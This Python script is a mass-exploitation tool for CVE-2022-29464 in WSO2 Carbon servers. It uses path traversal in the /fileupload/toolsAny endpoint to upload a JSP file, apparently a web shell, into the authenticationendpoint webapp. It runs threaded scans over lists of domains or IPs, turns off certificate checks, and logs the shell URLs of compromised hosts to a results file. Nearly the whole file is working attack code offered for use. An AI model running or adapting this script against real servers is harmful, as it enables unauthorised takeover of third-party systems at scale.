
import requests
import os
import urllib3
import concurrent.futures
from sys import stdout
from colorama import Fore, init

# Disable SSL warnings
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Create Results directory if it doesn't exist
if not os.path.exists('Results'):
    os.mkdir('Results')

# Clear the terminal screen
os.system('clear' if os.name == 'posix' else 'cls')


def banners():
    print("\n")
    print(Fore.LIGHTRED_EX +r" ___  _ _  ___    ___  ___  ___  ___         ___  ___  ___  ___  ___   ")
    print(Fore.LIGHTRED_EX +r"|  _]| | || __]  [_  ]|   |[_  ][_  ]  ___  [_  ][_  ]| . || __]| __|  ")
    print(Fore.LIGHTRED_EX +r"| [__| | || _]    / / | / | / /  / /  |___|  / /  / / `_  /| . \`__ \  ")
    print(Fore.LIGHTRED_EX +r"\___/|__/ |___]  [___] \__|[___][___]       [___][___] /_/ `___/|___/  ")
    print(Fore.GREEN+"Github"+Fore.LIGHTWHITE_EX+"     https://github.com/Pushkarup                    ")
    print(Fore.GREEN+"LinkedIn"+Fore.LIGHTWHITE_EX+"   https://www.linkedin.com/in/pushkar-upadhyay    ")
    print(f"{Fore.YELLOW}[PoC By PUSHKAR UPADHYAY] - {Fore.GREEN}PERFORM WITH MASS EXPLOITS WSO2 CARBON SERVER")
banners()

# Function to perform the exploit
def exploit(url):
    try:
        # Headers for the request
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                   'Content-Type': 'application/json'}  # .MF, .jspx, .jspf, .jsw, .jsv, xml, .war, .jsp, .aspx

        # Files to be uploaded
        files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/wb.jsp": open("wb.jsp", "rb")}

        # Send the POST request
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=10, verify=False, files=files)

        # Check the response
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.RED} .: {Fore.GREEN}[GREAT!] {Fore.YELLOW}- {Fore.GREEN}{url}/authenticationendpoint/wb.jsp")
            
            # Write successful URLs to Results.txt
            with open('Results/Results.txt', 'a') as f:
                f.write(f"{url}/authenticationendpoint/wb.jsp\n")
        else:
            print(f"{Fore.YELLOW}[CVE-2022-29464]{Fore.YELLOW} .: {Fore.RED}[Failed!] {Fore.YELLOW}- {Fore.RED}{url}")
    except KeyboardInterrupt:
        print(f"{Fore.CYAN}KeyboardInterrupt{Fore.RESET}")

# Function for a single scan
def single_scan():
    url = input(f"{Fore.YELLOW}[ENTER DOMAIN/IP] {Fore.RED}.: {Fore.WHITE}")
    
    # Check if the URL has a scheme, add 'https://' if not
    if not url.startswith("http"):
        url = "https://" + url
    exploit(url)

# Function for a mass scan
def mass_scan():
    urls_file = input(f"{Fore.YELLOW}[ENTER DOMAIN/IP LIST] {Fore.RED}.: {Fore.WHITE}")
    
    # Check if the file exists
    if not os.path.isfile(urls_file):
        print(f"{Fore.RED} ERROR!! FILE NOT FOUND")
        return

    # Read URLs from the file
    with open(urls_file, "r") as f:
        urls = f.read().splitlines()

    # Add 'https://' to URLs without a scheme
    urls = [url if url.startswith("http") else "https://" + url for url in urls]

    try:
        # Get the number of threads for concurrent scanning
        max_threads = int(input(f"{Fore.YELLOW}[ENTER NUMBER OF THREADS (50-100)] {Fore.RED}: {Fore.WHITE}"))

        # Use ThreadPoolExecutor for concurrent scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            results = [executor.submit(exploit, url) for url in urls]
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[KeyboardInterrupt]{Fore.RESET}")

# Main function to handle user input
def main():
    print(f"{Fore.RED}\t\t[1] - {Fore.YELLOW}SINGLE SCAN")
    print(f"{Fore.RED}\t\t[2] - {Fore.YELLOW}MASS SCAN\n")

    # Get user choice
    choice = input(f"{Fore.YELLOW}ENTER YOUR CHOICE {Fore.RED}.: ")
    if choice == "1":
        single_scan()
    elif choice == "2":
        mass_scan()
    else:
        print(f"{Fore.RED} ERROR!! FILE NOT FOUND")

# Run the main function
if __name__ == '__main__':
    main()
